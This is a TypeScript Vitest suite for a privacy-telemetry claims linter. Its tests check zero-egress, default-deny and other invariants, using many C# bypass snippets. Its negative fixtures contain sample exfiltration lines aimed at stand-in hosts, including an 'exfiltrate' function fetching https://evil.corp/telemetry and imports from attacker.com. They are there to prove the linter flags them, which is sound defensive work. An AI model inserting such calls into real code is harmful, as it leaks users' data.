import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it, expect } from 'vitest';
import {
  auditZeroEgress,
  auditAllowlistParity,
  auditDynamicClaims,
  auditHandoffProtocol,
  auditVocabulary,
  auditCentralPackageManagement,
  auditPortfolioMasterBrief,
} from '../../../scripts/audit-claims.mjs';

describe('Privacy Telemetry Claims & Invariant Linter Suite', () => {
  it('enforces zero-egress air-gap and default memory_only invariants', () => {
    const errors: string[] = [];
    auditZeroEgress(errors);
    expect(errors).toEqual([]);

    // Fixture-based negative test asserting unauthorized egress primitives are reported
    const primitiveErrors: string[] = [];
    auditZeroEgress(primitiveErrors, {
      overrideCodeSnippets: [
        'const f = fetch;',
        'navigator?.sendBeacon("/api/telemetry");',
        'const ws = new WebSocket("wss://evil.com");',
        "import('https://attacker.com/evil.js')",
        'import("https://attacker.com/evil.js")',
        "import(`https://attacker.com/evil.js`)",
        "new Worker('https://attacker.com/worker.js')",
        "new Worker(new URL('https://attacker.com/worker.js'))",
        "document.createElement('script')",
        "new Image()",
      ],
    });
    expect(primitiveErrors).toHaveLength(10);
    expect(primitiveErrors.some((e) => e.includes("import('https://attacker.com/evil.js')"))).toBe(true);
    expect(primitiveErrors.some((e) => e.includes('new Worker('))).toBe(true);
    expect(primitiveErrors.some((e) => e.includes("document.createElement('script')"))).toBe(true);

    // Benign fixture asserting comments and local workers are NOT flagged
    const benignErrors: string[] = [];
    auditZeroEgress(benignErrors, {
      overrideCodeSnippets: [
        "// import('https://attacker.com/evil.js')",
        "const a = 1; // new Worker('https://attacker.com/worker.js')",
        "new Worker(new URL('./edge-worker.ts', import.meta.url))",
      ],
    });
    expect(benignErrors).toEqual([]);

    // Negative fixture: reject computed fetch outside exportToOtlp while preserving exemption
    const tempDir = mkdtempSync(join(tmpdir(), 'kty-zero-egress-'));
    try {
      const mockExporter = join(tempDir, 'exporter.ts');
      writeFileSync(
        mockExporter,
        'export async function exportToOtlp() {\n  await fetch("http://collector:4318");\n}\n'
      );
      const mockLeak = join(tempDir, 'leak.ts');
      writeFileSync(
        mockLeak,
        'export function exfiltrate() {\n  globalThis["fetch"]("https://evil.corp/telemetry");\n}\n'
      );

      const computedErrors: string[] = [];
      auditZeroEgress(computedErrors, {
        overrideSrcDir: tempDir,
        overrideAuthorizedExporterPath: mockExporter,
      });

      const fetchViolations = computedErrors.filter((e) =>
        e.includes('fetch detected in non-exporter source')
      );
      expect(fetchViolations).toHaveLength(1);
      expect(fetchViolations[0]).toContain('leak.ts:2');

      // Reject non-fetch primitives even inside authorized exporter.ts
      const exporterTampered = join(tempDir, 'exporter_tampered.ts');
      writeFileSync(
        exporterTampered,
        'export async function exportToOtlp() {\n  await fetch("http://collector:4318");\n  new Worker("https://evil.corp/worker.js");\n}\n'
      );
      const tamperedErrors: string[] = [];
      auditZeroEgress(tamperedErrors, {
        overrideSrcDir: tempDir,
        overrideAuthorizedExporterPath: exporterTampered,
      });
      const workerViolations = tamperedErrors.filter((e) =>
        e.includes('Forbidden network primitive: new Worker')
      );
      expect(workerViolations).toHaveLength(1);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('enforces telemetry allowlist integrity and redaction parity between TS and .NET', () => {
    const errors: string[] = [];
    auditAllowlistParity(errors);
    expect(errors).toEqual([]);
  });

  it('enforces single source of truth for honest dynamic privacy claims', () => {
    const errors: string[] = [];
    auditDynamicClaims(errors);
    expect(errors).toEqual([]);
  });

  it('enforces cross-engine structured handoff protocol tool and category coverage', () => {
    const errors: string[] = [];
    auditHandoffProtocol(errors);
    expect(errors).toEqual([]);
  });

  it('enforces vocabulary guardrails eliminating unprovable marketing claims', () => {
    const errors: string[] = [];
    auditVocabulary(errors);
    expect(errors).toEqual([]);
  });

  it('enforces Central Package Management (CPM) and fail-closed NuGet audit configuration', () => {
    const errors: string[] = [];
    auditCentralPackageManagement(errors);
    expect(errors).toEqual([]);
  });

  it('enforces Portfolio Master Brief test count parity', () => {
    const errors: string[] = [];
    const checked = auditPortfolioMasterBrief(errors, { requireBrief: false });
    expect(errors).toEqual([]);
    expect(typeof checked).toBe('boolean');

    // Positive test: controlled brief fixture with isolated temporary test counting directories
    const tempBriefDir = mkdtempSync(join(tmpdir(), 'kty-brief-'));
    try {
      const mockBriefPath = join(tempBriefDir, 'MOCK_BRIEF.md');
      const mockTsDir = join(tempBriefDir, 'ts-tests');
      const mockNetDir = join(tempBriefDir, 'net-tests');
      mkdirSync(mockTsDir, { recursive: true });
      mkdirSync(mockNetDir, { recursive: true });
      const testCall = 'it';
      writeFileSync(join(mockTsDir, 'sample.test.ts'), `${testCall}("t1", () => {});\n${testCall}("t2", () => {});\n`);
      writeFileSync(join(mockNetDir, 'SampleTests.cs'), '[Fact]\npublic void T1() {}\n');
      writeFileSync(
        mockBriefPath,
        '| **`privacy-telemetry`** | TS/React (>=18), .NET 10 | Shared Core | 3/3 tests pass (2 TS + 1 .NET) |\n'
      );
      const fixtureErrors: string[] = [];
      const fixtureChecked = auditPortfolioMasterBrief(fixtureErrors, {
        requireBrief: true,
        overrideBriefPath: mockBriefPath,
        overrideTsTestsDir: mockTsDir,
        overrideNetTestsDir: mockNetDir,
      });
      expect(fixtureErrors).toEqual([]);
      expect(fixtureChecked).toBe(true);
    } finally {
      rmSync(tempBriefDir, { recursive: true, force: true });
    }

    // Negative test: brief required but missing
    const missingErrors: string[] = [];
    const missingChecked = auditPortfolioMasterBrief(missingErrors, {
      requireBrief: true,
      overrideBriefPath: '/non-existent/path/BRIEF.md',
    });
    expect(missingChecked).toBe(false);
    expect(missingErrors.length).toBeGreaterThan(0);
    expect(missingErrors[0]).toContain('not found but required via --require-brief');
  });

  it('binds PrivacyOptions.NetworkEgress default deny getter check specifically to NetworkEgress', () => {
    const spoofedErrors: string[] = [];
    auditZeroEgress(spoofedErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            private string _networkEgress = "deny";
            public bool BurnEnabled { get; set; } = true;
            public string DecoyProperty { get => _networkEgress; }
            public string NetworkEgress { get => "allow_otlp"; }
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(spoofedErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    const initializedAllowErrors: string[] = [];
    auditZeroEgress(initializedAllowErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            private string _networkEgress = "allow_otlp";
            public bool BurnEnabled { get; set; } = true;
            public string NetworkEgress { get => _networkEgress; set { _networkEgress = value; } }
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(initializedAllowErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    const separateDecoyErrors: string[] = [];
    auditZeroEgress(separateDecoyErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            public bool BurnEnabled { get; set; } = true;
            public string NetworkEgress { get; set; } = "allow_otlp";
        }
        public sealed class DecoyOptions
        {
            public string NetworkEgress { get; set; } = "deny";
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(separateDecoyErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    const commentedDenyErrors: string[] = [];
    auditZeroEgress(commentedDenyErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            public bool BurnEnabled { get; set; } = true;
            // public string NetworkEgress { get; set; } = "deny";
            public string NetworkEgress { get; set; } = "allow_otlp";
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(commentedDenyErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    const ctorOverrideErrors: string[] = [];
    auditZeroEgress(ctorOverrideErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            private string _networkEgress = "deny";
            public bool BurnEnabled { get; set; } = true;
            public PrivacyOptions() { _networkEgress = "allow_otlp"; }
            public string NetworkEgress { get => _networkEgress; }
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(ctorOverrideErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    const delegatedCtorErrors: string[] = [];
    auditZeroEgress(delegatedCtorErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            private string _networkEgress = "deny";
            public string NetworkEgress { get => _networkEgress; }
            public bool BurnEnabled { get; set; } = true;
            public PrivacyOptions() { EnableEgress(); }
            private void EnableEgress() { _networkEgress = "allow_otlp"; }
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(delegatedCtorErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    const genericDelegatedCtorErrors: string[] = [];
    auditZeroEgress(genericDelegatedCtorErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            private string _networkEgress = "deny";
            public string NetworkEgress { get => _networkEgress; }
            public bool BurnEnabled { get; set; } = true;
            public PrivacyOptions() { EnableEgress<int>(); }
            private void EnableEgress<T>() { _networkEgress = "allow_otlp"; }
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      genericDelegatedCtorErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const nestedDecoyErrors: string[] = [];
    auditZeroEgress(nestedDecoyErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class PrivacyOptions {
          private sealed class NestedDecoy {
            public string NetworkEgress { get; set; } = "deny";
          }
          private record DecoyRecord(string NetworkEgress);
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "allow";
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(nestedDecoyErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    const benignNestedErrors: string[] = [];
    auditZeroEgress(benignNestedErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class PrivacyOptions {
          private sealed class NestedConfig {
            public NestedConfig() { NetworkEgress = "allow"; }
            public string NetworkEgress { get; set; } = "allow";
          }
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(benignNestedErrors).toEqual([]);
  });

  it('CodeRabbit R33: rejects constructor deconstruction writes and ignores raw-string decoys before PrivacyOptions', () => {
    const deconstructionErrors: string[] = [];
    auditZeroEgress(deconstructionErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions
        {
            public bool BurnEnabled { get; set; } = true;
            public string NetworkEgress { get; set; } = "deny";
            public PrivacyOptions()
            {
                (NetworkEgress, _) = ("allow_otlp", 0);
            }
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      deconstructionErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const rawStringDecoyErrors: string[] = [];
    auditZeroEgress(rawStringDecoyErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        internal static class Templates
        {
            const string Decoy = """class PrivacyOptions { public string NetworkEgress { get; set; } = "deny"; }""";
            const string TelemetryDecoy = """public string Mode { get; set; } = "memory_only";""";
        }
        public sealed class PrivacyOptions
        {
            public bool BurnEnabled { get; set; } = true;
            public string NetworkEgress { get; set; } = "allow_otlp";
        }
        public sealed class TelemetryOptions
        {
            public string Mode { get; set; } = "otlp";
            public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      rawStringDecoyErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);
    expect(
      rawStringDecoyErrors.some((e) => e.includes('TelemetryOptions.Mode must default to "memory_only".'))
    ).toBe(true);
  });

  it('CodeRabbit R34: excludes attributed nested types when checking PrivacyOptions.NetworkEgress default', () => {
    const attributedNestedErrors: string[] = [];
    auditZeroEgress(attributedNestedErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class PrivacyOptions {
          [Obsolete] private sealed class NestedDecoy {
            public string NetworkEgress { get; set; } = "deny";
          }
          [System.ComponentModel.EditorBrowsable(System.ComponentModel.EditorBrowsableState.Never)]
          private struct NestedStructDecoy {
            public string NetworkEgress { get; set; } = "deny";
          }
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "allow_otlp";
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      attributedNestedErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const benignAttributedPropertyErrors: string[] = [];
    auditZeroEgress(benignAttributedPropertyErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class PrivacyOptions {
          [Obsolete] private sealed class NestedConfig {
            public string NetworkEgress { get; set; } = "allow";
          }
          public bool BurnEnabled { get; set; } = true;
          [Obsolete("kept for config binding")] public string NetworkEgress { get; set; } = "deny";
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(benignAttributedPropertyErrors).toEqual([]);
  });

  it('CodeRabbit R35: checks all partial PrivacyOptions declarations and rejects conditional compilation branches', () => {
    const splitPartialErrors: string[] = [];
    auditZeroEgress(splitPartialErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public partial class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
        }
        public partial class PrivacyOptions {
          public PrivacyOptions() { NetworkEgress = "allow_otlp"; }
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      splitPartialErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const multiFilePartialErrors: string[] = [];
    auditZeroEgress(multiFilePartialErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public partial class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
      overrideAdditionalNetOptionsContents: [
        `
          namespace KnowThankYew.Privacy.Telemetry.Configuration;
          public partial class PrivacyOptions {
            public PrivacyOptions() { NetworkEgress = "allow_otlp"; }
          }
        `,
      ],
    });
    expect(
      multiFilePartialErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const unresolvedSinglePartialErrors: string[] = [];
    auditZeroEgress(unresolvedSinglePartialErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public partial class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      unresolvedSinglePartialErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const zeroWidthCtorErrors: string[] = [];
    auditZeroEgress(zeroWidthCtorErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          public PrivacyOptions\\u200C() { NetworkEgress = "allow_otlp"; }
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      zeroWidthCtorErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const nullableDirectiveErrors: string[] = [];
    auditZeroEgress(nullableDirectiveErrors, {
      overrideNetOptionsContent: `
        #nullable enable
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
      overrideAdditionalNetOptionsContents: [
        `
          #if DEBUG
          namespace KnowThankYew.Privacy.Telemetry.Internal;
          internal static class DebugHelper {}
          #endif
        `,
      ],
    });
    expect(nullableDirectiveErrors).toEqual([]);

    const conditionalBranchErrors: string[] = [];
    auditZeroEgress(conditionalBranchErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
        #if false
          public string NetworkEgress { get; set; } = "deny";
        #else
          public string NetworkEgress { get; set; } = "allow_otlp";
        #endif
        }
        public class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      conditionalBranchErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);
  });

  it('CodeRabbit R36: scopes PrivacyOptions lookup by namespace, parses default(...) ctors, and blocks non-deny ctor writes', () => {
    // 1. PrivacyOptions in a foreign or missing namespace fails closed even when NetworkEgress = "deny".
    const wrongNsErrors: string[] = [];
    auditZeroEgress(wrongNsErrors, {
      overrideNetOptionsContent: `
        namespace Evil.Decoy;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(wrongNsErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    // 2. Decoy PrivacyOptions in foreign namespace cannot satisfy missing/broken target-namespace PrivacyOptions.
    const decoyAndBrokenErrors: string[] = [];
    auditZeroEgress(decoyAndBrokenErrors, {
      overrideNetOptionsContent: `
        namespace Evil.Decoy {
          public sealed class PrivacyOptions {
            public bool BurnEnabled { get; set; } = true;
            public string NetworkEgress { get; set; } = "deny";
          }
        }
        namespace KnowThankYew.Privacy.Telemetry.Configuration {
          public sealed class PrivacyOptions {
            public bool BurnEnabled { get; set; } = true;
            public string NetworkEgress { get; set; } = "allow_otlp";
          }
          public sealed class TelemetryOptions {
            public string Mode { get; set; } = "memory_only";
            public bool AllowRawPayloads { get; set; } = false;
          }
        }
      `,
    });
    expect(decoyAndBrokenErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    // 3. Valid nested block namespaces pass cleanly.
    const nestedNsErrors: string[] = [];
    auditZeroEgress(nestedNsErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry {
          namespace Configuration {
            public sealed class PrivacyOptions {
              public bool BurnEnabled { get; set; } = true;
              public string NetworkEgress { get; set; } = "deny";
              public PrivacyOptions(int unused = default(int)) => NetworkEgress = "deny";
            }
            public sealed class TelemetryOptions {
              public string Mode { get; set; } = "memory_only";
              public bool AllowRawPayloads { get; set; } = false;
            }
          }
        }
      `,
    });
    expect(nestedNsErrors).toEqual([]);

    // 4. Constructor parameter list containing default(int) must not truncate constructor parsing.
    const defaultParamOverrideErrors: string[] = [];
    auditZeroEgress(defaultParamOverrideErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          public PrivacyOptions(int unused = default(int)) {
            NetworkEgress = "allow_otlp";
          }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(defaultParamOverrideErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);

    // 5. Constructor writing arbitrary properties/fields (e.g., Enable = true; / BurnEnabled = false;) must fail closed.
    const arbitraryWriteErrors: string[] = [];
    auditZeroEgress(arbitraryWriteErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          public PrivacyOptions() {
            BurnEnabled = false;
          }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(arbitraryWriteErrors.some((e) => e.includes('PrivacyOptions.BurnEnabled must default to true.'))).toBe(true);

    const exprWriteErrors: string[] = [];
    auditZeroEgress(exprWriteErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          public bool Enable { get; set; } = false;
          public PrivacyOptions() => Enable = true;
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(exprWriteErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(true);
  });

  it('CodeRabbit R37: rejects base-class virtual overrides on implicit base() and ignores generic PrivacyOptions<T> decoys', () => {
    // 1. Implicit base() constructor executing a virtual override that mutates derived defaults fails closed.
    const inheritedOverrideErrors: string[] = [];
    auditZeroEgress(inheritedOverrideErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public class OptionsBase {
          public OptionsBase() { Initialize(); }
          protected virtual void Initialize() {}
        }
        public sealed class PrivacyOptions : OptionsBase {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          protected override void Initialize() { NetworkEgress = "allow_otlp"; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(inheritedOverrideErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(
      true
    );

    // 2. Safe generic PrivacyOptions<T> decoy does not mask an unsafe non-generic PrivacyOptions declaration.
    const genericDecoyErrors: string[] = [];
    auditZeroEgress(genericDecoyErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions<T> {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
        }
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "allow_otlp";
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(genericDecoyErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(
      true
    );
  });

  it('CodeRabbit R38: rejects custom setter bypass via NetworkEgress="deny" in constructor and verbatim @PrivacyOptions constructors', () => {
    // 1. Backing-field property whose setter overrides to "allow_otlp" fails closed when constructor writes NetworkEgress = "deny".
    const setterOverrideErrors: string[] = [];
    auditZeroEgress(setterOverrideErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          private string _networkEgress = "deny";
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress {
            get => _networkEgress;
            set { _networkEgress = "allow_otlp"; }
          }
          public PrivacyOptions() { NetworkEgress = "deny"; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(setterOverrideErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(
      true
    );

    // 2. Direct backing-field write (_networkEgress = "deny") in constructor does not invoke custom setter and remains valid.
    const directFieldWriteErrors: string[] = [];
    auditZeroEgress(directFieldWriteErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          private string _networkEgress = "deny";
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress {
            get => _networkEgress;
            set { _networkEgress = "allow_otlp"; }
          }
          public PrivacyOptions() { _networkEgress = "deny"; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(directFieldWriteErrors).toEqual([]);

    // 3. Verbatim identifier @PrivacyOptions() constructor with unsafe write fails closed (both normal and @ class spellings).
    const verbatimCtorErrors: string[] = [];
    auditZeroEgress(verbatimCtorErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          public @PrivacyOptions() { NetworkEgress = "allow_otlp"; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(verbatimCtorErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))).toBe(
      true
    );

    const verbatimClassAndCtorErrors: string[] = [];
    auditZeroEgress(verbatimClassAndCtorErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class @PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          public @PrivacyOptions() { NetworkEgress = "allow_otlp"; }
        }
        public sealed class @TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      verbatimClassAndCtorErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    // 4. Auto NetworkEgress with a _networkEgress property setter writing "allow_otlp" in ctor fails closed.
    const sneakyUnderscoreSetterErrors: string[] = [];
    auditZeroEgress(sneakyUnderscoreSetterErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          private string _networkEgress {
            set { NetworkEgress = "allow_otlp"; }
          }
          public PrivacyOptions() { _networkEgress = "deny"; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      sneakyUnderscoreSetterErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    // 5. Static backing field or field/property initializer invocation mutating defaults fails closed.
    const staticBackingFieldErrors: string[] = [];
    auditZeroEgress(staticBackingFieldErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          static private string _networkEgress = "deny";
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get => _networkEgress; set => _networkEgress = value; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      staticBackingFieldErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

    const fieldInitializerMutationErrors: string[] = [];
    auditZeroEgress(fieldInitializerMutationErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          private readonly string _init = EnableEgress();
          private string EnableEgress() { NetworkEgress = "allow_otlp"; return "x"; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      fieldInitializerMutationErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);

